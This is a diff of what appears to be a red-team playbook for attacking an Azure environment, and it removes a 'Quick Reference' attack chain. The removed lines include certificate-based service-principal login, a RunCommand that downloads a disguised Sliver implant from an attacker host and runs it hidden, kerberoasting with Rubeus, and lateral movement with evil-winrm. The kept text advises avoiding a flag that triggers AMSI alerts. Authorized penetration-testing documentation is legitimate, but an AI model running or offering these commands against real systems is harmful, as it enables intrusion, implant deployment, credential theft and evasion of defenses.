@@ -2,25 +2,6 @@
 
 Engagement-proven chain. Every command validated live. NO `--evasion` flag (causes AMSI alerts). Follow in order.
 
-## Quick Reference (Speed Run)
-
-```bash
-# 1. Auth (SP cert)
-Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId -CertificatePath $PfxPath -CertificatePassword $PfxPass
-
-# 2. Drop Harriet-wrapped Sliver via RunCommand (Tamper Protection blocks exclusions)
-$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\teams.exe -UseBasicParsing; Start-Process C:\Windows\Temp\teams.exe -WindowStyle Hidden'
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
-
-# 3. If Sliver won't land, use RunCommand directly for everything (kerberoast, lateral, etc.)
-
-# 5. Kerberoast (from Sliver session)
-rubeus -- kerberoast /format:hashcat /nowrap
-
-# 6. Lateral move
-# In Sliver: socks5 start -p 1080
-proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
-```
 
 ---
 
